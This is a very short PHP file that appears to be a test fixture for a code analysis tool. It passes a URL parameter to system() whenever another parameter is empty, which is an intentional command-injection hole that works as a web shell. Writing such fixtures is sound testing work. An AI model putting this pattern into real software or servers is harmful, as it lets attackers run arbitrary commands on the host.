<?php
// EXPECT: none
$x = $_GET['x'];
$v = $x ?: system($_GET['c']);
echo 'ok';
